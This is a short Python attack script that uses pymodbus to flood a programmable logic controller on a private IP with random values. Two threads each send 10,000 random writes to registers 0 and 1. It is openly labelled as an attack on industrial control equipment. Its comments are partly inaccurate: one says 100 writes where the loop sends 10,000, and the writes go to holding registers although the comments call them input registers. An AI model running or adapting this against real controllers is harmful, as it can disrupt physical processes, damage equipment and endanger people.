import threading
import random
from pymodbus.client import ModbusTcpClient

# Target PLC IP and port
TARGET_IP = "172.18.0.11"  # Replace with the PLC's IP
TARGET_PORT = 502         # Default Modbus port

def attack_input_register(thread_id, register_address):
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    if client.connect():
        print(f"Thread {thread_id} connected to {TARGET_IP}:{TARGET_PORT}")
        for _ in range(10000):  # Send 100 random writes
            value = random.randint(0, 65535)  # Random 16-bit value
            response = client.write_register(register_address, value, unit=1)
            if not response.isError():
                print(f"Thread {thread_id} set Input Register {register_address} to {value}")
            else:
                print(f"Thread {thread_id} failed to write to Input Register {register_address}")
        client.close()
    else:
        print(f"Thread {thread_id} failed to connect.")

# Input register addresses (%IW0 -> 0, %IW1 -> 1)
input_registers = [0, 1]

# Launch threads to attack both input registers
threads = []
for thread_id, register_address in enumerate(input_registers):
    t = threading.Thread(target=attack_input_register, args=(thread_id, register_address))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
